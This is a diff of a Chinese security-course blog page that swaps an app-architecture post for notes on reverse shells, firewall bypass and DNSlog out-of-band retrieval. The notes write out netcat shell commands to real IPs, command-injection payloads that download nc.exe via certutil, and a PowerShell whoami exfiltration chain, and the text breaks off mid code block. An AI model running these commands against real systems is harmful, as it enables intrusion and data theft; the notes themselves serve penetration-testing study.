@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="\nAPP架构&amp;小程序&amp;H5+Vue语言&amp;Web封装&amp;原生开发&amp;Flutter\nAPP应用开发架构： 原生开发 安卓一般使用java语言开发，当然现在也有kotlin语言开发。如何开发就涉及到具体编程了，这里就不详细说了。简单描述就是使用安卓提供的一系列控件来实习页面，复杂点页面可以通过自定义控件来实现。 使用H5语言开发 使用H5语言开发的好处有很多，可多端复用，比如浏览器端、ios端，当然H5开发的体验没有原生好的。结合经验来说，一般这个页面需要分享出去的话，就用H5开发。 使用flutter开发 flutter是近年来谷歌推出的一款UI框架，使用dart语言进行开发，支持跨平台，weight渲染直接操作硬件层，体验可媲美原生。但是flutter技术比较新，生态还不完善，开发起来效率相对偏低。 常规Web开发 Web App软件开发简单地说，就是开发一个网站，然后加入app的壳。Web App一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且app内的交互设计等非常有效。但开发周期长，需要的技术人员少，成本低。 APP-开发架构-原生态-IDEA 演示：remusic 项目源码 安全影响： 反编译&amp;抓包&amp;常规测试 逆向的角度去分析逻辑设计安全 APP-开发架构-Web封装-封装平台 演示：ShopXO源代码程序+一门APP打包 安全影响：常规Web安全测试 APP-开发架构- H5&amp;Vue-HBuilderX 演示：HBuilderX案例 安全影响：API&amp;JS框架安全问题&amp;JS前端测试 微信小程序-开发框架- Web封装-平台 演示：ShopXO源码程序+一门APP打包 安全影响：常规Web安全测试 ">
-<title>基础入门app应用与微信小程序应用</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" 基础入门-反弹 SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载\n知识点包括： 1、渗透命令-常规命令&amp;文件上传下载 2、反弹 Shell-防火墙策略&amp;正反向连接 3、数据回显-查询带外&amp;网络协议层级 文件上传下载-解决无图形化&amp;解决数据传输 常规基本渗透命令详解 ： https://blog.csdn.net/weixin_43303273/article/details/83029138 命令生成： 用下面的网站可以生成适配Linux和Windows的安装链接 https://forum.ywhack.com/bountytips.php?download Linux：wget、curl、python、ruby、perl、java 等 Windows：PowerShell、Certutil、Bitsadmin、msiexec、mshta、rundll32 等 反弹 Shell 命令-解决数据回显&amp;解决数据通讯 命令生成： https://forum.ywhack.com/shell.php\n">
+<title>基础入门反弹SHELL与带外查询</title>
 
-<link rel='canonical' href='https://wzy-yaemiko.top/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8app%E5%BA%94%E7%94%A8%E4%B8%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BA%94%E7%94%A8/'>
+<link rel='canonical' href='https://wzy-yaemiko.top/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BC%B9shell%E4%B8%8E%E5%B8%A6%E5%A4%96%E6%9F%A5%E8%AF%A2/'>
 
-<link rel="stylesheet" href="/scss/style.min.bcb1a2db70a603dc98c87c4bc0071d00451923533a45e2c34ae857a459df74bf.css"><meta property='og:title' content="基础入门app应用与微信小程序应用">
-<meta property='og:description' content="\nAPP架构&amp;小程序&amp;H5+Vue语言&amp;Web封装&amp;原生开发&amp;Flutter\nAPP应用开发架构： 原生开发 安卓一般使用java语言开发，当然现在也有kotlin语言开发。如何开发就涉及到具体编程了，这里就不详细说了。简单描述就是使用安卓提供的一系列控件来实习页面，复杂点页面可以通过自定义控件来实现。 使用H5语言开发 使用H5语言开发的好处有很多，可多端复用，比如浏览器端、ios端，当然H5开发的体验没有原生好的。结合经验来说，一般这个页面需要分享出去的话，就用H5开发。 使用flutter开发 flutter是近年来谷歌推出的一款UI框架，使用dart语言进行开发，支持跨平台，weight渲染直接操作硬件层，体验可媲美原生。但是flutter技术比较新，生态还不完善，开发起来效率相对偏低。 常规Web开发 Web App软件开发简单地说，就是开发一个网站，然后加入app的壳。Web App一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且app内的交互设计等非常有效。但开发周期长，需要的技术人员少，成本低。 APP-开发架构-原生态-IDEA 演示：remusic 项目源码 安全影响： 反编译&amp;抓包&amp;常规测试 逆向的角度去分析逻辑设计安全 APP-开发架构-Web封装-封装平台 演示：ShopXO源代码程序+一门APP打包 安全影响：常规Web安全测试 APP-开发架构- H5&amp;Vue-HBuilderX 演示：HBuilderX案例 安全影响：API&amp;JS框架安全问题&amp;JS前端测试 微信小程序-开发框架- Web封装-平台 演示：ShopXO源码程序+一门APP打包 安全影响：常规Web安全测试 ">
-<meta property='og:url' content='https://wzy-yaemiko.top/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8app%E5%BA%94%E7%94%A8%E4%B8%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BA%94%E7%94%A8/'>
+<link rel="stylesheet" href="/scss/style.min.bcb1a2db70a603dc98c87c4bc0071d00451923533a45e2c34ae857a459df74bf.css"><meta property='og:title' content="基础入门反弹SHELL与带外查询">
+<meta property='og:description' content=" 基础入门-反弹 SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载\n知识点包括： 1、渗透命令-常规命令&amp;文件上传下载 2、反弹 Shell-防火墙策略&amp;正反向连接 3、数据回显-查询带外&amp;网络协议层级 文件上传下载-解决无图形化&amp;解决数据传输 常规基本渗透命令详解 ： https://blog.csdn.net/weixin_43303273/article/details/83029138 命令生成： 用下面的网站可以生成适配Linux和Windows的安装链接 https://forum.ywhack.com/bountytips.php?download Linux：wget、curl、python、ruby、perl、java 等 Windows：PowerShell、Certutil、Bitsadmin、msiexec、mshta、rundll32 等 反弹 Shell 命令-解决数据回显&amp;解决数据通讯 命令生成： https://forum.ywhack.com/shell.php\n">
+<meta property='og:url' content='https://wzy-yaemiko.top/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BC%B9shell%E4%B8%8E%E5%B8%A6%E5%A4%96%E6%9F%A5%E8%AF%A2/'>
 <meta property='og:site_name' content='wzy朔夜观星'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='基础入门' /><meta property='article:tag' content='小迪' /><meta property='article:published_time' content='2025-04-06T21:18:24&#43;08:00'/><meta property='article:modified_time' content='2025-04-06T21:18:24&#43;08:00'/><meta property='og:image' content='https://wzy-yaemiko.top/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8app%E5%BA%94%E7%94%A8%E4%B8%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BA%94%E7%94%A8/zly2.jpg' />
-<meta name="twitter:title" content="基础入门app应用与微信小程序应用">
-<meta name="twitter:description" content="\nAPP架构&amp;小程序&amp;H5+Vue语言&amp;Web封装&amp;原生开发&amp;Flutter\nAPP应用开发架构： 原生开发 安卓一般使用java语言开发，当然现在也有kotlin语言开发。如何开发就涉及到具体编程了，这里就不详细说了。简单描述就是使用安卓提供的一系列控件来实习页面，复杂点页面可以通过自定义控件来实现。 使用H5语言开发 使用H5语言开发的好处有很多，可多端复用，比如浏览器端、ios端，当然H5开发的体验没有原生好的。结合经验来说，一般这个页面需要分享出去的话，就用H5开发。 使用flutter开发 flutter是近年来谷歌推出的一款UI框架，使用dart语言进行开发，支持跨平台，weight渲染直接操作硬件层，体验可媲美原生。但是flutter技术比较新，生态还不完善，开发起来效率相对偏低。 常规Web开发 Web App软件开发简单地说，就是开发一个网站，然后加入app的壳。Web App一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且app内的交互设计等非常有效。但开发周期长，需要的技术人员少，成本低。 APP-开发架构-原生态-IDEA 演示：remusic 项目源码 安全影响： 反编译&amp;抓包&amp;常规测试 逆向的角度去分析逻辑设计安全 APP-开发架构-Web封装-封装平台 演示：ShopXO源代码程序+一门APP打包 安全影响：常规Web安全测试 APP-开发架构- H5&amp;Vue-HBuilderX 演示：HBuilderX案例 安全影响：API&amp;JS框架安全问题&amp;JS前端测试 微信小程序-开发框架- Web封装-平台 演示：ShopXO源码程序+一门APP打包 安全影响：常规Web安全测试 "><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://wzy-yaemiko.top/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8app%E5%BA%94%E7%94%A8%E4%B8%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BA%94%E7%94%A8/zly2.jpg' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='基础入门' /><meta property='article:tag' content='小迪' /><meta property='article:published_time' content='2025-04-07T22:45:04&#43;08:00'/><meta property='article:modified_time' content='2025-04-07T22:45:04&#43;08:00'/><meta property='og:image' content='https://wzy-yaemiko.top/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BC%B9shell%E4%B8%8E%E5%B8%A6%E5%A4%96%E6%9F%A5%E8%AF%A2/xh.jpg' />
+<meta name="twitter:title" content="基础入门反弹SHELL与带外查询">
+<meta name="twitter:description" content=" 基础入门-反弹 SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载\n知识点包括： 1、渗透命令-常规命令&amp;文件上传下载 2、反弹 Shell-防火墙策略&amp;正反向连接 3、数据回显-查询带外&amp;网络协议层级 文件上传下载-解决无图形化&amp;解决数据传输 常规基本渗透命令详解 ： https://blog.csdn.net/weixin_43303273/article/details/83029138 命令生成： 用下面的网站可以生成适配Linux和Windows的安装链接 https://forum.ywhack.com/bountytips.php?download Linux：wget、curl、python、ruby、perl、java 等 Windows：PowerShell、Certutil、Bitsadmin、msiexec、mshta、rundll32 等 反弹 Shell 命令-解决数据回显&amp;解决数据通讯 命令生成： https://forum.ywhack.com/shell.php\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://wzy-yaemiko.top/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BC%B9shell%E4%B8%8E%E5%B8%A6%E5%A4%96%E6%9F%A5%E8%AF%A2/xh.jpg' />
     </head>
     <body class="
     article-page
@@ -293,11 +293,11 @@
   <ol>
     <li>
       <ol>
-        <li><a href="#app应用开发架构">APP应用开发架构：</a></li>
-        <li><a href="#app-开发架构-原生态-idea">APP-开发架构-原生态-IDEA</a></li>
-        <li><a href="#app-开发架构-web封装-封装平台">APP-开发架构-Web封装-封装平台</a></li>
-        <li><a href="#app-开发架构--h5vue-hbuilderx">APP-开发架构- H5&amp;Vue-HBuilderX</a></li>
-        <li><a href="#微信小程序-开发框架--web封装-平台">微信小程序-开发框架- Web封装-平台</a></li>
+        <li><a href="#知识点包括">知识点包括：</a></li>
+        <li><a href="#文件上传下载-解决无图形化解决数据传输">文件上传下载-解决无图形化&amp;解决数据传输</a></li>
+        <li><a href="#反弹-shell-命令-解决数据回显解决数据通讯">反弹 Shell 命令-解决数据回显&amp;解决数据通讯</a></li>
+        <li><a href="#防火墙绕过-正向连接反向连接内网服务器">防火墙绕过-正向连接&amp;反向连接&amp;内网服务器</a></li>
+        <li><a href="#防火墙组合数据不回显-icmp带外查询dnslog">防火墙组合数据不回显-ICMP带外查询Dnslog</a></li>
       </ol>
     </li>
   </ol>
@@ -314,13 +314,13 @@
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8app%E5%BA%94%E7%94%A8%E4%B8%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BA%94%E7%94%A8/">
-                <img src="/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8app%E5%BA%94%E7%94%A8%E4%B8%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BA%94%E7%94%A8/zly2_hu_86c3a9d6ff4d5b85.jpg"
-                        srcset="/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8app%E5%BA%94%E7%94%A8%E4%B8%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BA%94%E7%94%A8/zly2_hu_86c3a9d6ff4d5b85.jpg 800w, /p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8app%E5%BA%94%E7%94%A8%E4%B8%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BA%94%E7%94%A8/zly2_hu_da04a913b4beede0.jpg 1600w"
+            <a href="/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BC%B9shell%E4%B8%8E%E5%B8%A6%E5%A4%96%E6%9F%A5%E8%AF%A2/">
+                <img src="/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BC%B9shell%E4%B8%8E%E5%B8%A6%E5%A4%96%E6%9F%A5%E8%AF%A2/xh_hu_c1cb8e7a53ef0384.jpg"
+                        srcset="/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BC%B9shell%E4%B8%8E%E5%B8%A6%E5%A4%96%E6%9F%A5%E8%AF%A2/xh_hu_c1cb8e7a53ef0384.jpg 800w, /p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BC%B9shell%E4%B8%8E%E5%B8%A6%E5%A4%96%E6%9F%A5%E8%AF%A2/xh_hu_440d8e306c9aaac3.jpg 1600w"
                         width="800" 
-                        height="533" 
+                        height="521" 
                         loading="lazy"
-                        alt="Featured image of post 基础入门app应用与微信小程序应用" />
+                        alt="Featured image of post 基础入门反弹SHELL与带外查询" />
                 
             </a>
         </div>
@@ -338,7 +338,7 @@
     
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8app%E5%BA%94%E7%94%A8%E4%B8%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BA%94%E7%94%A8/">基础入门app应用与微信小程序应用</a>
+            <a href="/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BC%B9shell%E4%B8%8E%E5%B8%A6%E5%A4%96%E6%9F%A5%E8%AF%A2/">基础入门反弹SHELL与带外查询</a>
         </h2>
     
         
@@ -360,7 +360,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025-04-06</time>
+                <time class="article-time--published">2025-04-07</time>
             </div>
         
         
@@ -374,7 +374,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 2 分钟
+                    阅读时长: 3 分钟
                 </time>
             </div>
         
@@ -383,7 +383,7 @@
         <div>
             <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-file-word"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M14 3v4a1 1 0 0 0 1 1h4" /><path d="M17 21h-10a2 2 0 0 1 -2 -2v-14a2 2 0 0 1 2 -2h7l5 5v11a2 2 0 0 1 -2 2" /><path d="M9 12l1.333 5l1.667 -4l1.667 4l1.333 -5" /></svg>
             <time class="article-words">
-                765字
+                1383字
             </time>
         </div>
     </footer>
@@ -395,53 +395,311 @@
     <section class="article-content">
     
     
-    <p><img src="https://y.gtimg.cn/music/photo_new/T053M0000028Cb5q1wh3qr.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="image.png"
-	
-	
-></p>
-<blockquote>
-<p>APP架构&amp;小程序&amp;H5+Vue语言&amp;Web封装&amp;原生开发&amp;Flutter</p></blockquote>
-<h3 id="app应用开发架构">APP应用开发架构：
-</h3><ol>
-<li>原生开发
-安卓一般使用java语言开发，当然现在也有kotlin语言开发。如何开发就涉及到具体编程了，这里就不详细说了。简单描述就是使用安卓提供的一系列控件来实习页面，复杂点页面可以通过自定义控件来实现。</li>
-<li>使用H5语言开发
-使用H5语言开发的好处有很多，可多端复用，比如浏览器端、ios端，当然H5开发的体验没有原生好的。结合经验来说，一般这个页面需要分享出去的话，就用H5开发。</li>
-<li>使用flutter开发
-flutter是近年来谷歌推出的一款UI框架，使用dart语言进行开发，支持跨平台，weight渲染直接操作硬件层，体验可媲美原生。但是flutter技术比较新，生态还不完善，开发起来效率相对偏低。</li>
-<li>常规Web开发
-Web App软件开发简单地说，就是开发一个网站，然后加入app的壳。Web App一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且app内的交互设计等非常有效。但开发周期长，需要的技术人员少，成本低。</li>
-</ol>
-<h3 id="app-开发架构-原生态-idea">APP-开发架构-原生态-IDEA
+    <blockquote>
+<p>基础入门-反弹 SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载</p></blockquote>
+<h3 id="知识点包括">知识点包括：
+</h3><pre><code>1、渗透命令-常规命令&amp;文件上传下载 
+2、反弹 Shell-防火墙策略&amp;正反向连接 
+3、数据回显-查询带外&amp;网络协议层级 
+</code></pre>
+<h3 id="文件上传下载-解决无图形化解决数据传输">文件上传下载-解决无图形化&amp;解决数据传输
 </h3><ul>
-<li>演示：remusic 项目源码</li>
-<li>安全影响：
+<li>常规基本渗透命令详解 ：
+<a class="link" href="https://blog.csdn.net/weixin_43303273/article/details/83029138"  target="_blank" rel="noopener"
+    >https://blog.csdn.net/weixin_43303273/article/details/83029138</a></li>
+<li>命令生成：
+用下面的网站可以生成适配Linux和Windows的安装链接
+<a class="link" href="https://forum.ywhack.com/bountytips.php?download"  target="_blank" rel="noopener"
+    >https://forum.ywhack.com/bountytips.php?download</a>
 <ol>
-<li>反编译&amp;抓包&amp;常规测试</li>
-<li>逆向的角度去分析逻辑设计安全</li>
+<li>Linux：wget、curl、python、ruby、perl、java 等</li>
+<li>Windows：PowerShell、Certutil、Bitsadmin、msiexec、mshta、rundll32 等</li>
 </ol>
 </li>
 </ul>
-<h3 id="app-开发架构-web封装-封装平台">APP-开发架构-Web封装-封装平台
+<h3 id="反弹-shell-命令-解决数据回显解决数据通讯">反弹 Shell 命令-解决数据回显&amp;解决数据通讯
 </h3><ul>
-<li>演示：ShopXO源代码程序+一门APP打包</li>
-<li>安全影响：常规Web安全测试</li>
+<li>
+<p>命令生成：
+<a class="link" href="https://forum.ywhack.com/shell.php"  target="_blank" rel="noopener"
+    >https://forum.ywhack.com/shell.php</a></p>
+</li>
+<li>
+<p>1、正向连接：本地监听等待对方连接</p>
+<ul>
+<li>Linux 控制 Windows
+<ul>
+<li>绑定 CMD 到本地 5566 端口
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -e cmd -lvp 5566 
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>主动连接目标 5566
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ncat 47.122.23.131 5566 
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ul>
-<h3 id="app-开发架构--h5vue-hbuilderx">APP-开发架构- H5&amp;Vue-HBuilderX
-</h3><ul>
-<li>演示：HBuilderX案例</li>
-<li>安全影响：API&amp;JS框架安全问题&amp;JS前端测试</li>
+</li>
+<li>Windows 控制 Linux
+<ul>
+<li>绑定 SH 到本地 5566 端口
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ncat -e /bin/sh -lvp 5566 
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>主动连接目标 5566
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc 47.94.236.117 5566 
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ul>
-<h3 id="微信小程序-开发框架--web封装-平台">微信小程序-开发框架- Web封装-平台
+</li>
+</ul>
+</li>
+<li>
+<p>2、反向连接：主动给出去，对方监听</p>
+<ul>
+<li>绑定 CMD 到目标 5566 端口
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ncat -e /bin/sh 47.122.23.131 5566 
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>等待 5566 连接
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -lvvp 5566 
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>绑定 CMD 到目标 5566 端口
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -e cmd 47.94.236.117 5566 
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>等待 5566 连接
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ncat -lvvp 5566 
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</li>
+<li>
+<p>实际演示：</p>
+<ul>
+<li>
+<p>1、判断windows</p>
+</li>
+<li>
+<p>2、windows没有自带的nc</p>
+</li>
+<li>
+<p>3、想办法上传nc反弹权限</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">127.0.0.1 | certutil.exe -urlcache -split -f http://47.94.236.117:80/nc.exe c:\\nc.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>4.反弹</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">127.0.0.1 | c:\\nc.exe -e cmd -|vvp 5566
+</span></span><span class="line"><span class="cl">ncat 47.122.23.131 5566
+</span></span><span class="line"><span class="cl">//正向连接
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">127.0.0.1 | c:\\nc.exe -e cmd 47.94.236.117 5566
+</span></span><span class="line"><span class="cl">ncat -|vvp 5566
+</span></span><span class="line"><span class="cl">//反向连接
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</li>
+</ul>
+<h3 id="防火墙绕过-正向连接反向连接内网服务器">防火墙绕过-正向连接&amp;反向连接&amp;内网服务器
 </h3><ul>
-<li>演示：ShopXO源码程序+一门APP打包</li>
-<li>安全影响：常规Web安全测试</li>
+<li>
+<p>管道符：|（管道符号）||（逻辑或）＆&amp;（逻辑与）＆（后台任务符号）</p>
+<ul>
+<li>Windows-&gt; | 、&amp;、 ||、 &amp;&amp;</li>
+<li>Linux-&gt; ;、 |、 ||、 &amp; 、&amp;&amp; 、‘ ’、（特有‘ ’和 ;）</li>
+</ul>
+</li>
+<li>
+<p>例子：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ping 127.0.0.1 ; whoami //前后命令都执行 
+</span></span><span class="line"><span class="cl">ping 127.0.0.1 | whoami  //执行whoami命令
+</span></span><span class="line"><span class="cl">ping  127.0.0.1 || whoami  //前后命令都执行 
+</span></span><span class="line"><span class="cl">ping  127.0.0.1 &amp; whoami //前后命令都执行 ，但ping  127.0.0.1在后台执行
+</span></span><span class="line"><span class="cl">ping  127.0.0.1 &amp;&amp; whoami //前后命令都执行
+</span></span><span class="line"><span class="cl">ping  &#39;whoami&#39;. f4an93.dnslog.cn //执行‘ ’中的whoami,并在其结果后加上. f4an93.dnslog.cn
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>开启入站策略即入站限制了5566，采用反向连接给出去</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Linux: ncat -lvvp 5566
+</span></span><span class="line"><span class="cl">Windows: nc -e cmd 47.94.236.117 5566
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>开启出站策略即出站限制了5566，采用正向连接</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Linux: ncat 47.122.23.131 5566
+</span></span><span class="line"><span class="cl">Windows: nc.exe -e cmd -lvvp 5566
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>” 但进来难，出去宽松“若做了出站策略很有可能正向连接会被防火墙墙了</p>
+</li>
+<li>
+<p>正反向反弹案例-内网服务器</p>
+<ul>
+<li>只能内网主动交出数据，反向连接</li>
+</ul>
+</li>
+</ul>
+<h3 id="防火墙组合数据不回显-icmp带外查询dnslog">防火墙组合数据不回显-ICMP带外查询Dnslog
+</h3><ul>
+<li>
+<p>出站入站都开启策略（漏洞有，但是数据不回显）：OSI网络七层</p>
+</li>
+<li>
+<p>两种方案：</p>
+<p>1.反弹shell</p>
+<p>2.带外直询(Windows服务器情况下)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">127.0.0.1 | powershell  // 用powershell变量赋值，并将执行结果带出来 
+</span></span><span class="line"><span class="cl">$x=whoami;  //将x赋值为whoami
+</span></span><span class="line"><span class="cl">$x=$x.Replace (&#39; \ &#39;,&#39;xxx&#39;); //因为结果带有“\〞导致ping无法执行，所以Replace(&#39;\&#39;,&#39;xxx&#39;)，用xxx代替\
+</span></span><span class="line"><span class="cl">$y=&#39;.f4an93.dnslog.cn&#39;; //将y赋值为.f4an93.dnslog.cn
+</span></span><span class="line"><span class="cl">$z=$x+$y; //将x、y和赋值给z
+</span></span><span class="line"><span class="cl">ping $z //ping  z
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>综合起来用的命令为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
